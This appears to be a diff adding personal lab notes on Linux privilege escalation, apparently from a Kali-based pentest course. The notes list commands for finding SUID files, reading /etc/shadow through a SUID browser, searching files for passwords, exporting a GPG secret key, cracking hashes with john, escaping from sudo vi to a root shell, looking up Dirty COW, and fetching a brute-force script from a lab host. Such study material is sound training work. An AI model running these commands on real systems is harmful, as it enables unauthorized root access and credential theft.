@@ -252,3 +252,94 @@ cat /run/systemd/container
 
 ./home/kali/tools/LinEnum.sh -t -r "/tmp/linenum_report.txt"
 linenum -t -r "/tmp/linenum_report.txt"
+linenum -t -k "root"
+
+# Privilege Escalation
+
+ls -l /etc/passwd
+touch my_new_file.sh
+chown kali:kali my_new_file.sh
+chmod u+rwx,g+r,o+r my_new_file.sh
+
+# File Access Control List
+sudo groupadd sysadmins
+sudo useradd eve -G sysadmins
+sudo useradd alice -G sysadmins
+sudo useradd bob -G sysadmins
+
+touch facl_example.txt
+getfacl facl_example.txt
+setfacl -m g:sysadmins:r-- facl_example.txt
+setfacl -m u:eve:--- facl_example.txt
+
+# SetUID and SetGID
+ls -l /usr/bin/at
+ls -l /usr/bin/passwd
+ls -ld /tmp
+
+mkdir /tmp/test
+chmod +t /tmp/test
+ls -ld /tmp/test
+
+find / -perm -o=r
+find / -perm -o=w
+find / -perm -o=rwx 2> /dev/null
+
+find / -perm -4000 2> /dev/null  SetUID
+find / -perm -2000 2> /dev/null  SetGUID
+find / -perm -1000 2> /dev/null  Stricky Bit
+
+stat /usr/bin/elinks
+ls -ld /usr/bin/elinks
+elinks https://google.com -dump 1
+elinks file:///etc/shadow -dump 1
+
+find . -type f -exec grep -i password {} \;
+
+nuclei -tags token,file,github -u 172.16.10.13  Current machine/local search
+
+# Public/Private Keys
+
+gpg --list-keys
+touch private_pgp_key.pgp
+gpg --output "private_pgp_key.pgp" --armor --export-secret-key arodriguez@acme-infinity-servers.com
+
+# Crack Password from /etc/shadow
+john ch09/password-cracking/hashes.txt --format=crypt --wordlist=ch09/password-cracking/wordlist.txt
+john ch09/password-cracking/hashes.txt --format=crypt
+john --show ch09/password-cracking/hashes.txt
+
+# sudo configuration
+
+sudo -l
+ls -ld /etc/sudoers
+cat /etc/sudoers
+ls -ld /etc/sudoers.d
+cat /etc/sudoers.d/kali-grant-root
+
+# check my groups membership
+groups
+
+sudo vi /etc/demo.txt
+cat /etc/passwd
+sudo vi /etc/passwd
+
+sudo vi   Press SHIFT-: (together) > enter !bash > logged in as root user
+
+passwd
+su - backup
+su - root
+
+# Kernal Exploits
+
+uname -r -v
+searchsploit linux kernel | grep -i "dirty cow"
+
+grep "/bin/bash" /etc/passwd | grep -v "backup"
+sudo curl http://172.16.10.1:8080/local_account_bf.sh -o $(pwd)/local_account_bf.sh
+sudo curl http://172.16.10.1:8080/passwords.txt -o $(pwd)/passwords.txt
+
+unix-privesc-check standard
+unix-privesc-check detailed
+
+
